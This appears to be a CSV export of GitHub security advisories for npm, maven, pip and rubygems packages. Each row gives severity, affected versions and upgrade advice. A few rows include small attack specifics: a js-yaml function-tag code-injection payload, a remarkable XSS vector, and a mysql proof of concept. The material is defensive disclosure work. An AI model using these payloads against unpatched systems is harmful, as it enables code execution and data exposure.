1042,17465,dot,GHSA-4859-gpc7-4j66,,https://github.com/advisories/GHSA-4859-gpc7-4j66,moderate,2019-06-05 21:24:29 UTC,Command Injection in dot,All versions of dot are vulnerable to Command Injection. The template compilation may execute arbitrary commands if an attacker can inject code in the template or if a Prototype Pollution-like vulnerability can be exploited to alter an Object's prototype.,npm
1043,18714,sequelize-cli,GHSA-3xc7-xg67-pw99,,https://github.com/advisories/GHSA-3xc7-xg67-pw99,low,2019-06-05 20:43:10 UTC,Sensitive Data Exposure in sequelize-cli,"Versions of `sequelize-cli` prior to 5.5.0 are vulnerable to Sensitive Data Exposure. The function `filteredURL()` does not properly sanitize the `config.password` value which may cause passwords with special characters to be logged in plain text.


## Recommendation

Upgrade to version 5.5.0 or later.",npm
1044,15862,axios,GHSA-42xw-2xvc-qx8m,CVE-2019-10742,https://github.com/advisories/GHSA-42xw-2xvc-qx8m,high,2019-05-29 18:04:45 UTC,Denial of Service in axios,"Versions of `axios` prior to 0.18.1 are vulnerable to Denial of Service. If a request exceeds the `maxContentLength` property, the package prints an error but does not stop the request. This may cause high CPU usage and lead to Denial of Service.


## Recommendation

Upgrade to 0.18.1 or later.",npm
1045,15997,js-yaml,GHSA-2pr6-76vf-7546,,https://github.com/advisories/GHSA-2pr6-76vf-7546,moderate,2019-06-05 14:35:29 UTC,Denial of Service in js-yaml,"Versions of `js-yaml` prior to 3.13.0 are vulnerable to Denial of Service. By parsing a carefully-crafted YAML file, the node process stalls and may exhaust system resources leading to a Denial of Service.


## Recommendation

Upgrade to version 3.13.0.",npm
1046,16065,marked,GHSA-xf5p-87ch-gxw2,,https://github.com/advisories/GHSA-xf5p-87ch-gxw2,moderate,2019-06-05 14:10:03 UTC,Marked ReDoS due to email addresses being evaluated in quadratic time,"Versions of `marked` from 0.3.14 until 0.6.2 are vulnerable to Regular Expression Denial of Service. Email addresses may be evaluated in quadratic time, allowing attackers to potentially crash the node process due to resource exhaustion.


## Recommendation

Upgrade to version 0.6.2 or later.",npm
1047,16664,canvas,GHSA-vpq5-4rc8-c222,,https://github.com/advisories/GHSA-vpq5-4rc8-c222,moderate,2019-06-05 14:10:45 UTC,Denial of Service in canvas,"Versions of `canvas` prior to 1.6.10 are vulnerable to Denial of Service. Processing malicious JPEGs or GIFs could crash the node process.


## Recommendation

Upgrade to version 1.6.10",npm
1048,15997,js-yaml,GHSA-8j8c-7jfh-h6hx,,https://github.com/advisories/GHSA-8j8c-7jfh-h6hx,high,2019-06-04 20:14:07 UTC,Code Injection in js-yaml,"Versions of `js-yaml` prior to 3.13.1 are vulnerable to Code Injection. The `load()` function may execute arbitrary code injected through a malicious YAML file. Objects that have `toString` as key, JavaScript code as value and are used as explicit mapping keys allow attackers to execute the supplied code through the `load()` function. The `safeLoad()` function is unaffected.

An example payload is 
`{ toString: !<tag:yaml.org,2002:js/function> 'function (){return Date.now()}' } : 1` 
which returns the object 
{
  ""1553107949161"": 1
}


## Recommendation

Upgrade to version 3.13.1.",npm
1049,16330,sequelize,GHSA-wfp9-vr4j-f49j,,https://github.com/advisories/GHSA-wfp9-vr4j-f49j,high,2019-06-04 20:04:27 UTC,NoSQL Injection in sequelize,"Versions of `sequelize` prior to 4.12.0 are vulnerable to NoSQL Injection. Query operators such as `$gt` are not properly sanitized and may allow an attacker to alter data queries, leading to NoSQL Injection.


## Recommendation

Upgrade to version 4.12.0 or later",npm
1050,18137,pem,GHSA-pgcr-7wm4-mcv6,,https://github.com/advisories/GHSA-pgcr-7wm4-mcv6,critical,2019-06-04 15:42:45 UTC,Sensitive Data Exposure in pem,"Versions of `pem` before 1.13.2 expose sensitive data when the `readPkcs12` is used. 

The `readPkcs12` function reads the certificate and key data from a pkcs12 file using the encryption password. As part of this process it creates a globally readable file with a filename of 20 random 0-f characters in the temporary directory containing the password which is then read by OpenSSL. The file containing the password is never cleaned up after it is used giving access to the pkcs12 password to any other users with access to read files from the system.



## Recommendation

Update to version 1.13.2 or later.",npm
1051,34575,org.springframework.data:spring-data-jpa,GHSA-xggx-fx6w-v7ch,CVE-2019-3802,https://github.com/advisories/GHSA-xggx-fx6w-v7ch,moderate,2019-06-04 15:42:15 UTC,Improper Neutralization of Wildcards or Matching Symbols,"This affects Spring Data JPA in versions up to and including 2.1.6, 2.0.14 and 1.11.20. ExampleMatcher using ExampleMatcher.StringMatcher.STARTING, ExampleMatcher.StringMatcher.ENDING or ExampleMatcher.StringMatcher.CONTAINING could return more results than anticipated when a maliciously crafted example value is supplied.",maven
1052,18070,command-exists,GHSA-cff4-rrq6-h78w,,https://github.com/advisories/GHSA-cff4-rrq6-h78w,critical,2019-06-03 17:31:26 UTC,Command Injection in command-exists,"Versions of `command-exists` before 1.2.4 are vulnerable to command injection. This is exploitable if user input is provided to this module.


## Recommendation

Update to version 1.2.4 or later.",npm
1053,16269,concat-stream,GHSA-g74r-ffvr-5q9f,,https://github.com/advisories/GHSA-g74r-ffvr-5q9f,moderate,2019-06-03 17:26:44 UTC,Memory Exposure in concat-stream,"Versions of `concat-stream` before 1.5.2 are vulnerable to memory exposure if userp provided input is passed into `write()`

Versions <1.3.0 are not affected due to not using unguarded Buffer constructor.



## Recommendation

Update to version 1.5.2, 1.4.11, 1.3.2 or later.

If you are unable to update make sure user provided input into the `write()` function is not a number.",npm
1054,17221,bl,GHSA-wrw9-m778-g6mc,,https://github.com/advisories/GHSA-wrw9-m778-g6mc,moderate,2019-06-03 17:27:57 UTC,Memory Exposure in bl,"Versions of `bl` before 0.9.5 and 1.0.1 are vulnerable to memory exposure.

`bl.append(number)` in the affected `bl` versions passes a number to Buffer constructor, appending a chunk of uninitialized memory


## Recommendation

Update to version 0.9.5, 1.0.1 or later.",npm
1055,16369,web3,GHSA-27v7-qhfv-rqq8,,https://github.com/advisories/GHSA-27v7-qhfv-rqq8,low,2019-05-30 17:26:30 UTC,Insecure Credential Storage in web3,"All versions of `web3` are vulnerable to Insecure Credential Storage. The package stores encrypted wallets in local storage and requires a password to load the wallet. Once the wallet is loaded, the private key is accessible via LocalStorage. Exploiting this vulnerability likely requires a Cross-Site Scripting vulnerability to access the private key.


## Recommendation

No fix is currently available. Consider using an alternative module until a fix is made available.",npm
1056,17330,fstream,GHSA-xf7w-r453-m56c,CVE-2019-13173,https://github.com/advisories/GHSA-xf7w-r453-m56c,high,2019-05-30 17:19:34 UTC,Arbitrary File Overwrite in fstream,"Versions of `fstream` prior to 1.0.12 are vulnerable to Arbitrary File Overwrite. Extracting tarballs containing a hardlink to a file that already exists in the system and a file that matches the hardlink will overwrite the system's file with the contents of the extracted file. The `fstream.DirWriter()` function is vulnerable.


## Recommendation

Upgrade to version 1.0.12 or later.",npm
1057,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-jjpq-gp5q-8q6w,CVE-2019-0221,https://github.com/advisories/GHSA-jjpq-gp5q-8q6w,moderate,2019-05-30 03:30:42 UTC,Cross-site scripting in Apache Tomcat,"The SSI printenv command in Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39 and 7.0.0 to 7.0.93 echoes user provided data without escaping and is, therefore, vulnerable to XSS. SSI is disabled by default. The printenv command is intended for debugging and is unlikely to be present in a production website.",maven
1058,34093,org.apache.zookeeper:zookeeper,GHSA-2hw2-62cp-p9p7,CVE-2019-0201,https://github.com/advisories/GHSA-2hw2-62cp-p9p7,moderate,2019-05-29 18:54:11 UTC,Access control bypass in Apache ZooKeeper,"An issue is present in Apache ZooKeeper 1.0.0 to 3.4.13 and 3.5.0-alpha to 3.5.4-beta. ZooKeeper?s getACL() command doesn?t check any permission when retrieves the ACLs of the requested node and returns all information contained in the ACL Id field as plaintext string. DigestAuthenticationProvider overloads the Id field with the hash value that is used for user authentication. As a consequence, if Digest Authentication is in use, the unsalted hash value will be disclosed by getACL() request for unauthenticated or unprivileged users.",maven
1059,34261,org.apache.camel:camel-core,GHSA-h896-mx9x-g32g,CVE-2019-0188,https://github.com/advisories/GHSA-h896-mx9x-g32g,high,2019-05-29 18:15:50 UTC,XML External Entity injection in Apache Camel,"Apache Camel prior to 2.24.0 contains an XML external entity injection (XXE) vulnerability (CWE-611) due to using an outdated vulnerable JSON-lib library. This affects only the camel-xmljson component, which was removed.",maven
1060,16466,tar,GHSA-j44m-qm6p-hp7m,CVE-2018-20834,https://github.com/advisories/GHSA-j44m-qm6p-hp7m,high,2019-05-01 18:37:31 UTC,Arbitrary File Overwrite in tar,"Versions of `tar` prior to 4.4.2 for 4.x and 2.2.2 for 2.x are vulnerable to Arbitrary File Overwrite. Extracting tarballs containing a hardlink to a file that already exists in the system, and a file that matches the hardlink will overwrite the system's file with the contents of the extracted file.


## Recommendation

For tar 4.x, upgrade to version 4.4.2 or later.
For tar 2.x, upgrade to version 2.2.2 or later.",npm
1061,16144,mysql,GHSA-5f7m-mmpc-qhh4,,https://github.com/advisories/GHSA-5f7m-mmpc-qhh4,moderate,2019-05-23 09:27:00 UTC,mysql Node.JS Module Vulnerable to Remote Memory Exposure,"Versions of `mysql` before 2.14.0 are vulnerable to remove memory exposure.

Affected versions of `mysql` package allocate and send an uninitialized memory over the network when a number is provided as a password.

Only `mysql` running on Node.js versions below 6.0.0 are affected due to a throw added in newer node.js versions.

Proof of Concept:

```
require('mysql').createConnection({
  host: 'localhost',
  user: 'user',
  password : USERPROVIDEDINPUT,  // number
  database : 'my_db'
}).connect();
```



## Recommendation

Update to version 2.14.0 or later.",npm
1062,15991,webpack-bundle-analyzer,GHSA-pgr8-jg6h-8gw6,,https://github.com/advisories/GHSA-pgr8-jg6h-8gw6,moderate,2019-05-23 09:26:20 UTC,Cross-Site Scripting in webpack-bundle-analyzer,"Versions of `webpack-bundle-analyzer` prior to 3.3.2 are vulnerable to Cross-Site Scripting. The package uses `JSON.stringify()` without properly escaping input which may lead to Cross-Site Scripting.


## Recommendation

Upgrade to version 3.3.2 or later.",npm
1063,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-5ww9-j83m-q7qx,CVE-2019-12086,https://github.com/advisories/GHSA-5ww9-j83m-q7qx,high,2019-05-23 09:32:24 UTC,Information exposure in FasterXML jackson-databind,"A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x before 2.9.9. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint, the service has the mysql-connector-java jar (8.0.14 or earlier) in the classpath, and an attacker can host a crafted MySQL server reachable by the victim, an attacker can send a crafted JSON message that allows them to read arbitrary local files on the server. This occurs because of missing com.mysql.cj.jdbc.admin.MiniAdmin validation.",maven
1064,34016,com.thoughtworks.xstream:xstream,GHSA-f554-x222-wgf7,CVE-2013-7285,https://github.com/advisories/GHSA-f554-x222-wgf7,critical,2019-05-29 18:05:03 UTC,Command Injection in Xstream,"Xstream API versions up to 1.4.6 and version 1.4.10, if the security framework has not been initialized, may allow a remote attacker to run arbitrary shell commands by manipulating the processed input stream when unmarshaling XML or any supported format. e.g. JSON.",maven
1065,17984,remarkable,GHSA-36m4-6v6m-4vpr,CVE-2019-12043,https://github.com/advisories/GHSA-36m4-6v6m-4vpr,moderate,2019-05-29 18:04:55 UTC,Cross-site Scripting in remarkable,"In remarkable 1.7.1, lib/parser_inline.js mishandles URL filtering, which allows attackers to trigger XSS via unprintable characters, as demonstrated by a \x0ejavascript: URL.",npm
1066,34575,org.springframework.data:spring-data-jpa,GHSA-jgmr-wrwx-mgfj,CVE-2019-3797,https://github.com/advisories/GHSA-jgmr-wrwx-mgfj,moderate,2019-05-14 04:02:35 UTC,Exposure of Sensitive Information to an Unauthorized Actor and SQL Injection in Spring Data JPA,"This affects Spring Data JPA in versions up to and including 2.1.5, 2.0.13 and 1.11.19. Derived queries using any of the predicates ?startingWith?, ?endingWith? or ?containing? could return more results than anticipated when a maliciously crafted query parameter value is supplied. Also, LIKE expressions in manually defined queries could return unexpected results if the parameter values bound did not have escaped reserved characters properly.",maven
1067,35475,org.springframework.cloud:spring-cloud-config-server,GHSA-4x49-w62v-76q7,CVE-2019-3799,https://github.com/advisories/GHSA-4x49-w62v-76q7,moderate,2019-05-23 08:39:23 UTC,Path Traversal in Spring Cloud Config,"Spring Cloud Config, versions 2.1.x prior to 2.1.2, versions 2.0.x prior to 2.0.4, and versions 1.4.x prior to 1.4.6, and older unsupported versions allow applications to serve arbitrary configuration files through the spring-cloud-config-server module. A malicious user, or attacker, can send a request using a specially crafted URL that can lead a directory traversal attack.",maven
1068,35456,org.apache.sanselan:sanselan,GHSA-rjx9-2936-9ffx,CVE-2018-17201,https://github.com/advisories/GHSA-rjx9-2936-9ffx,high,2019-05-14 04:01:06 UTC,Improper Input Validation in Apache Sanselan,"Certain input files could make the code hang when Apache Sanselan 0.97-incubator was used to parse them, which could be used in a DoS attack. Note that Apache Sanselan (incubating) was renamed to Apache Commons Imaging.",maven
1069,35456,org.apache.sanselan:sanselan,GHSA-g99m-3m46-4gm9,CVE-2018-17202,https://github.com/advisories/GHSA-g99m-3m46-4gm9,high,2019-05-14 04:00:47 UTC,Infinite Loop in Apache Sanselan,"Certain input files could make the code to enter into an infinite loop when Apache Sanselan 0.97-incubator was used to parse them, which could be used in a DoS attack. Note that Apache Sanselan (incubating) was renamed to Apache Commons Imaging.",maven
1070,34261,org.apache.camel:camel-core,GHSA-4wjq-69rc-8wcp,CVE-2019-0194,https://github.com/advisories/GHSA-4wjq-69rc-8wcp,high,2019-05-02 15:21:34 UTC,Path Traversal in Apache Camel,"Apache Camel's File is vulnerable to directory traversal. Camel 2.21.0 to 2.21.3, 2.22.0 to 2.22.2, 2.23.0 and the unsupported Camel 2.x (2.19 and earlier) versions may be also affected.",maven
1071,17431,tar-fs,GHSA-x2mc-8fgj-3wmr,CVE-2018-20835,https://github.com/advisories/GHSA-x2mc-8fgj-3wmr,high,2019-05-01 18:37:18 UTC,Improper Input Validation in tar-fs,"A vulnerability was found in tar-fs before 1.16.2. An Arbitrary File Overwrite issue exists when extracting a tarball containing a hardlink to a file that already exists on the system, in conjunction with a later plain file with the same name as the hardlink. This plain file content replaces the existing file content.",npm
1072,20741,tensorflow,GHSA-mfg7-x5m7-6p8w,CVE-2019-9635,https://github.com/advisories/GHSA-mfg7-x5m7-6p8w,moderate,2019-04-30 15:37:17 UTC,NULL Pointer Dereference in Google TensorFlow,NULL pointer dereference in Google TensorFlow before 1.12.2 could cause a denial of service via an invalid GIF file.,pip
1073,35825,org.keycloak:keycloak-core,GHSA-gc52-xj6p-9pxp,CVE-2019-3868,https://github.com/advisories/GHSA-gc52-xj6p-9pxp,moderate,2019-04-30 15:37:21 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Keycloak,Keycloak up to version 6.0.0 allows the end user token (access or id token JWT) to be used as the session cookie for browser sessions for OIDC. As a result an attacker with access to service provider backend could hijack user?s browser session.,maven
1074,20741,tensorflow,GHSA-mw6v-crh8-8533,CVE-2018-7575,https://github.com/advisories/GHSA-mw6v-crh8-8533,critical,2019-04-30 15:36:41 UTC,Integer Overflow or Wraparound in Google TensorFlow,Google TensorFlow 1.7.x and earlier is affected by a Buffer Overflow vulnerability. The type of exploitation is context-dependent.,pip
1075,20741,tensorflow,GHSA-943p-xc6m-c6gr,CVE-2018-7574,https://github.com/advisories/GHSA-943p-xc6m-c6gr,high,2019-04-30 15:37:27 UTC,Rejected CVE ID,"** REJECT ** DO NOT USE THIS CANDIDATE NUMBER. ConsultIDs: CVE-2018-7576,
CVE-2018-21233. Reason: this candidate was intended for one issue, but the
description and references inadvertently combined multiple issues. Notes:
All CVE users should consult CVE-2018-7576 and CVE-2018-21233 to determine
which ID is appropriate. All references and descriptions in this candidate
have been removed to prevent accidental usage.",pip
1076,20741,tensorflow,GHSA-q492-f7gr-27rp,CVE-2018-10055,https://github.com/advisories/GHSA-q492-f7gr-27rp,high,2019-04-30 15:37:31 UTC,Improper Restriction of Operations within the Bounds of a Memory Buffer in Google TensorFlow,Invalid memory access and/or a heap buffer overflow in the TensorFlow XLA compiler in Google TensorFlow before 1.7.1 could cause a crash or read from other parts of process memory via a crafted configuration file.,pip
1077,20741,tensorflow,GHSA-qx2v-j445-g354,CVE-2018-7577,https://github.com/advisories/GHSA-qx2v-j445-g354,high,2019-04-30 15:37:34 UTC,Improper Input Validation in Google TensorFlow,"Memcpy parameter overlap in Google Snappy library 1.1.4, as used in Google TensorFlow before 1.7.1, could result in a crash or read from other parts of process memory.",pip
1078,15892,jquery,GHSA-6c3j-c64m-qhgq,CVE-2019-11358,https://github.com/advisories/GHSA-6c3j-c64m-qhgq,moderate,2019-04-26 16:29:11 UTC,"XSS in jQuery as used in Drupal, Backdrop CMS, and other products","jQuery before 3.4.0, as used in Drupal, Backdrop CMS, and other products, mishandles jQuery.extend(true, {}, ...) because of Object.prototype pollution. If an unsanitized source object contained an enumerable __proto__ property, it could extend the native Object.prototype.",npm
1079,20741,tensorflow,GHSA-frxx-2m33-6wcr,CVE-2018-8825,https://github.com/advisories/GHSA-frxx-2m33-6wcr,high,2019-04-24 16:11:30 UTC,Improper Restriction of Operations within the Bounds of a Memory Buffer in Google TensorFlow,Google TensorFlow 1.7 and below is affected by: Buffer Overflow. The impact is: execute arbitrary code (local).,pip
1080,15892,jquery,GHSA-wv67-q8rr-grjp,CVE-2019-5428,https://github.com/advisories/GHSA-wv67-q8rr-grjp,moderate,2019-04-23 15:59:10 UTC,Duplicate Advisory: Prototype Pollution in jquery,"## Duplicate Advisory
This advisory is a duplicate of [GHSA-6c3j-c64m-qhgq](https://github.com/advisories/GHSA-6c3j-c64m-qhgq). This link is maintained to preserve external references.

## Original Description
Versions of `jquery`  prior to 3.4.0 are vulnerable to Prototype Pollution. The extend() method allows an attacker to modify the prototype for `Object` causing changes in properties that will exist on all objects.

## Recommendation
Upgrade to version 3.4.0 or later.",npm
1081,19842,urllib3,GHSA-mh33-7rrq-662w,CVE-2019-11324,https://github.com/advisories/GHSA-mh33-7rrq-662w,high,2019-04-19 16:55:10 UTC,Improper Certificate Validation,"The urllib3 library before 1.24.2 for Python mishandles certain cases where the desired set of CA certificates is different from the OS store of CA certificates, which results in SSL connections succeeding in situations where a verification failure is the correct outcome. This is related to use of the ssl_context, ca_certs, or ca_certs_dir argument.",pip
1082,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-r53m-pfr5-7v87,,https://github.com/advisories/GHSA-r53m-pfr5-7v87,moderate,2019-04-18 14:50:19 UTC,Moderate severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core,**Withdrawn:** Duplicate of GHSA-qcxh-w3j9-58qr,maven
1083,20810,apache-airflow,GHSA-w6j4-3gh2-9f5j,CVE-2019-0229,https://github.com/advisories/GHSA-w6j4-3gh2-9f5j,high,2019-04-18 14:27:40 UTC,High severity vulnerability that affects apache-airflow,A number of HTTP endpoints in the Airflow webserver (both RBAC and classic) did not have adequate protection and were vulnerable to cross-site request forgery attacks.,pip
1084,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-8vmx-qmch-mpqg,CVE-2019-0232,https://github.com/advisories/GHSA-8vmx-qmch-mpqg,high,2019-04-18 14:27:35 UTC,High severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core,"When running on Windows with enableCmdLineArguments enabled, the CGI Servlet in Apache Tomcat 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39 and 7.0.0 to 7.0.93 is vulnerable to Remote Code Execution due to a bug in the way the JRE passes command line arguments to Windows. The CGI Servlet is disabled by default. The CGI option enableCmdLineArguments is disable by default in Tomcat 9.0.x (and will be disabled by default in all versions in response to this vulnerability). For a detailed explanation of the JRE behaviour, see Markus Wulftange's blog (https://codewhitesec.blogspot.com/2016/02/java-and-command-line-injections-in-windows.html) and this archived MSDN blog (https://web.archive.org/web/20161228144344/https://blogs.msdn.microsoft.com/twistylittlepassagesallalike/2011/04/23/everyone-quotes-command-line-arguments-the-wrong-way/).",maven
1085,19847,SQLAlchemy,GHSA-38fc-9xqv-7f7q,CVE-2019-7548,https://github.com/advisories/GHSA-38fc-9xqv-7f7q,high,2019-04-16 15:50:39 UTC,SQLAlchemy contains Improper Neutralization of Special Elements used in an SQL Command,SQLAlchemy 1.2.17 has SQL Injection when the group_by parameter can be controlled.,pip
1086,19847,SQLAlchemy,GHSA-887w-45rq-vxgf,CVE-2019-7164,https://github.com/advisories/GHSA-887w-45rq-vxgf,critical,2019-04-16 15:50:41 UTC,SQLAlchemy vulnerable to Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection'),SQLAlchemy through 1.2.17 and 1.3.x through 1.3.0b2 allows SQL Injection via the order_by parameter.,pip
1087,34025,org.springframework.security:spring-security-core,GHSA-v2r2-7qm7-jj6v,CVE-2019-3795,https://github.com/advisories/GHSA-v2r2-7qm7-jj6v,moderate,2019-04-16 15:10:59 UTC,Moderate severity vulnerability that affects org.springframework.security:spring-security-core,"Spring Security versions 4.2.x prior to 4.2.12, 5.0.x prior to 5.0.12, and 5.1.x prior to 5.1.5 contain an insecure randomness vulnerability when using SecureRandomFactoryBean#setSeed to configure a SecureRandom instance. In order to be impacted, an honest application must provide a seed and make the resulting random material available to an attacker for inspection.",maven
1088,20092,ansible,GHSA-74vq-h4q8-x6jv,CVE-2019-3828,https://github.com/advisories/GHSA-74vq-h4q8-x6jv,moderate,2019-04-15 16:19:19 UTC,Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') in Ansible,"Ansible fetch module before versions 2.5.15, 2.6.14, 2.7.8 has a path traversal vulnerability which allows copying and overwriting files outside of the specified destination in the local ansible controller host, by not restricting an absolute path.",pip
1089,20810,apache-airflow,GHSA-8p7v-2jvj-v54r,CVE-2019-0216,https://github.com/advisories/GHSA-8p7v-2jvj-v54r,moderate,2019-04-12 20:42:25 UTC,Moderate severity vulnerability that affects apache-airflow,A malicious admin user could edit the state of objects in the Airflow metadata database to execute arbitrary javascript on certain page views.,pip
1090,19836,Jinja2,GHSA-hj2j-77xm-mc5v,CVE-2016-10745,https://github.com/advisories/GHSA-hj2j-77xm-mc5v,high,2019-04-10 14:30:13 UTC,High severity vulnerability that affects Jinja2,"In Pallets Jinja before 2.8.1, str.format allows a sandbox escape.",pip
1091,19836,Jinja2,GHSA-462w-v97r-4m45,CVE-2019-10906,https://github.com/advisories/GHSA-462w-v97r-4m45,high,2019-04-10 14:30:24 UTC,High severity vulnerability that affects Jinja2,"In Pallets Jinja before 2.10.1, str.format_map allows a sandbox escape.",pip
1092,20024,notebook,GHSA-rcx2-m7jp-p9wj,CVE-2019-10856,https://github.com/advisories/GHSA-rcx2-m7jp-p9wj,moderate,2019-04-09 19:47:27 UTC,Moderate severity vulnerability that affects notebook,"In Jupyter Notebook before 5.7.8, an open redirect can occur via an empty netloc. This issue exists because of an incomplete fix for CVE-2019-10255.",pip
1093,18643,materialize-css,GHSA-rg3q-jxmp-pvjj,CVE-2019-11004,https://github.com/advisories/GHSA-rg3q-jxmp-pvjj,moderate,2019-04-09 19:44:37 UTC,Materialize-css vulnerable to Improper Neutralization of Input During Web Page Generation,"In Materialize through 1.0.0, XSS is possible via the Toast feature.",npm
1094,18976,bootstrap-sass,GHSA-vqqv-v9m2-48p2,CVE-2019-10842,https://github.com/advisories/GHSA-vqqv-v9m2-48p2,critical,2019-04-04 16:28:47 UTC,Critical severity vulnerability that affects bootstrap-sass,"Arbitrary code execution (via backdoor code) was discovered in bootstrap-sass 3.2.0.3, when downloaded from rubygems.org. An unauthenticated attacker can craft the ___cfduid cookie value with base64 arbitrary code to be executed via eval(), which can be leveraged to execute arbitrary code on the target system. Note that there are three underscore characters in the cookie name. This is unrelated to the __cfduid cookie that is legitimately used by Cloudflare.",rubygems
1095,34791,org.apache.hbase:hbase,GHSA-535v-4x9q-446c,CVE-2019-0212,https://github.com/advisories/GHSA-535v-4x9q-446c,high,2019-04-02 15:47:00 UTC,Improper Authorization in org.apache.hbase:hbase,"In all previously released Apache HBase 2.x versions (2.0.0-2.0.4, 2.1.0-2.1.3), authorization was incorrectly applied to users of the HBase REST server. Requests sent to the HBase REST server were executed with the permissions of the REST server itself, not with the permissions of the end-user. This issue is only relevant when HBase is configured with Kerberos authentication, HBase authorization is enabled, and the REST server is configured with SPNEGO authentication. This issue does not extend beyond the HBase REST server.",maven
1096,20024,notebook,GHSA-rv62-4pmj-xw6h,CVE-2019-10255,https://github.com/advisories/GHSA-rv62-4pmj-xw6h,moderate,2019-04-02 15:46:54 UTC,Moderate severity vulnerability that affects jupyterhub and notebook,"An Open Redirect vulnerability for all browsers in Jupyter Notebook before 5.7.8 and some browsers (Chrome, Firefox) in JupyterHub before 0.9.6 allows crafted links to the login page, which will redirect to a malicious site after successful login. Servers running on a base_url prefix are not affected.",pip
1097,35045,org.apache.activemq:activemq-client,GHSA-jpv3-g4cc-6vfx,CVE-2019-0222,https://github.com/advisories/GHSA-jpv3-g4cc-6vfx,high,2019-04-02 15:46:42 UTC,Improper Control of Generation of Code ('Code Injection') in org.apache.activemq:activemq-client,"In Apache ActiveMQ 5.0.0 - 5.15.8, unmarshalling corrupt MQTT frame can lead to broker Out of Memory exception making it unresponsive.",maven
1098,29399,splunk-sdk,GHSA-f58w-649r-qjr9,CVE-2019-5729,https://github.com/advisories/GHSA-f58w-649r-qjr9,high,2019-03-25 16:18:04 UTC,Moderate severity vulnerability that affects splunk-sdk,"Splunk-SDK-Python before 1.6.6 does not properly verify untrusted TLS server certificates, which could result in man-in-the-middle attacks.",pip
1099,20253,python-gnupg,GHSA-2fch-jvg5-crf6,CVE-2019-6690,https://github.com/advisories/GHSA-2fch-jvg5-crf6,high,2019-03-25 16:17:53 UTC,Improper Input Validation python-gnupg,"python-gnupg 0.4.3 allows context-dependent attackers to trick gnupg to decrypt other ciphertext than intended. To perform the attack, the passphrase to gnupg must be controlled by the adversary and the ciphertext should be trusted. Related to a ""CWE-20: Improper Input Validation"" issue affecting the affect functionality component.",pip
1100,16097,morgan,GHSA-gwg9-rgvj-4h5j,CVE-2019-5413,https://github.com/advisories/GHSA-gwg9-rgvj-4h5j,moderate,2019-03-25 18:03:23 UTC,Code Injection in morgan,"Verisons of `morgan` before 1.9.1 are vulnerable to code injection when user input is allowed into the filter or combined with a prototype pollution attack.


## Recommendation

Update to version 1.9.1 or later.",npm
1101,16484,serve,GHSA-v588-qcp3-jv46,CVE-2019-5415,https://github.com/advisories/GHSA-v588-qcp3-jv46,high,2019-03-25 18:03:58 UTC,Path Traversal in serve,"Versions of `serve` prior to 7.0.1 are vulnerable to Path Traversal. Explicitly ignored folders can be accessed through if the path contains a `/./`, which allows attackers to access hidden folders and files.


## Recommendation

Upgrade to version 7.0.1 or later.",npm
1102,16484,serve,GHSA-xg75-3277-gvvj,CVE-2019-5417,https://github.com/advisories/GHSA-xg75-3277-gvvj,high,2019-03-25 18:04:01 UTC,Directory Traversal in serve,"Versions of `serve` before 7.1.3 are vulnerable to Directory Traversal. File paths are not sanitized leading to unauthorized access of system files.


## Recommendation

Upgrade to version 7.1.3 or later",npm
1103,36192,org.apache.karaf:apache-karaf,GHSA-869j-5855-hjpm,CVE-2019-0191,https://github.com/advisories/GHSA-869j-5855-hjpm,moderate,2019-03-25 16:16:44 UTC,Moderate severity vulnerability that affects org.apache.karaf:apache-karaf and org.apache.karaf:karaf,"Apache Karaf kar deployer reads .kar archives and extracts the paths from the ""repository/"" and ""resources/"" entries in the zip file. It then writes out the content of these paths to the Karaf repo and resources directories. However, it doesn't do any validation on the paths in the zip file. This means that a malicious user could craft a .kar file with "".."" directory names and break out of the directories to write arbitrary content to the filesystem. This is the ""Zip-slip"" vulnerability - https://snyk.io/research/zip-slip-vulnerability. This vulnerability is low if the Karaf process user has limited permission on the filesystem. Any Apache Karaf releases prior 4.2.3 is impacted.",maven
1104,18908,devise,GHSA-73rf-6mrf-759q,CVE-2019-5421,https://github.com/advisories/GHSA-73rf-6mrf-759q,moderate,2019-03-19 18:03:25 UTC,Moderate severity vulnerability that affects devise,Devise ruby gem before 4.6.0 when the `lockable` module is used is vulnerable to a time-of-check time-of-use (TOCTOU) race condition due to `increment_failed_attempts` within the `Devise::Models::Lockable` class not being concurrency safe.,rubygems
1105,17681,highcharts,GHSA-xmc8-cjfr-phx3,CVE-2018-20801,https://github.com/advisories/GHSA-xmc8-cjfr-phx3,high,2019-03-18 15:59:32 UTC,Regular Expression Denial of Service in highcharts,"Versions of `highcharts` prior to 6.1.0 are vulnerable to Regular Expression Denial of Service (ReDoS). Untrusted input may cause catastrophic backtracking while matching regular expressions. This can cause the application to be unresponsive leading to Denial of Service.


## Recommendation

Upgrade to version 6.1.0 or higher.",npm
1106,34940,com.puppycrawl.tools:checkstyle,GHSA-gp32-7h29-rpxm,CVE-2019-9658,https://github.com/advisories/GHSA-gp32-7h29-rpxm,moderate,2019-03-14 15:39:14 UTC,Moderate severity vulnerability that affects com.puppycrawl.tools:checkstyle,"Checkstyle prior to 8.18 loads external DTDs by default, which can potentially lead to denial of service attacks or the leaking of confidential information.",maven
1107,35118,org.springframework.security.oauth:spring-security-oauth2,GHSA-77rv-6vfw-x4gc,CVE-2019-3778,https://github.com/advisories/GHSA-77rv-6vfw-x4gc,critical,2019-03-14 15:39:30 UTC,Critical severity vulnerability that affects org.springframework.security.oauth:spring-security-oauth and org.springframework.security.oauth:spring-security-oauth2,"Spring Security OAuth, versions 2.3 prior to 2.3.5, and 2.2 prior to 2.2.4, and 2.1 prior to 2.1.4, and 2.0 prior to 2.0.17, and older unsupported versions could be susceptible to an open redirector attack that can leak an authorization code.

A malicious user or attacker can craft a request to the authorization endpoint using the authorization code grant type, and specify a manipulated redirection URI via the ""redirect_uri"" parameter. This can cause the authorization server to redirect the resource owner user-agent to a URI under the control of the attacker with the leaked authorization code.

